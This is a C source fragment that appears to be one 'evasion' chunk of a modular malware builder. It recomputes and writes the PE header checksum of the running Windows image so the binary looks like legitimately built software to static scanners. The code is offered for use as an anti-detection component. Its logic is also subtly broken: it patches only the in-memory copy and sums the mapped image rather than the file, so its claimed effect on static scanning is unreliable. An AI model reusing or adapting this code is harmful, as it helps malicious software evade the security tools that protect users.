// chunk: evasion/checksum_spoof
// depends: (none)
// provides: spoof_pe_checksum
// headers: windows.h
// risk: none
// note: Recalculates and sets a valid PE checksum on the running image.
//       Many static scanners flag binaries with zero/invalid checksums as
//       suspicious. This patches the PE optional header in memory with
//       a correct checksum, mimicking legitimately signed/built software.

#ifndef CHUNK_CHECKSUM_SPOOF
#define CHUNK_CHECKSUM_SPOOF

#include <windows.h>

static void spoof_pe_checksum(void) {
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *pe = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);

    DWORD size = pe->OptionalHeader.SizeOfImage;
    DWORD checksum_offset = (DWORD)((BYTE *)&pe->OptionalHeader.CheckSum - (BYTE *)base);

    /* Calculate PE checksum (same algorithm as MapFileAndCheckSum) */
    ULONGLONG sum = 0;
    WORD *ptr = (WORD *)base;
    DWORD words = size / 2;

    DWORD old;
    VirtualProtect(&pe->OptionalHeader.CheckSum, 4, PAGE_READWRITE, &old);
    pe->OptionalHeader.CheckSum = 0;

    for (DWORD i = 0; i < words; i++) {
        /* Skip the checksum field itself */
        DWORD byte_offset = (DWORD)(i * 2);
        if (byte_offset >= checksum_offset && byte_offset < checksum_offset + 4)
            continue;
        sum += ptr[i];
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = (sum & 0xFFFF) + (sum >> 16);
    sum += size;

    pe->OptionalHeader.CheckSum = (DWORD)sum;
    VirtualProtect(&pe->OptionalHeader.CheckSum, 4, old, &old);
}

#endif
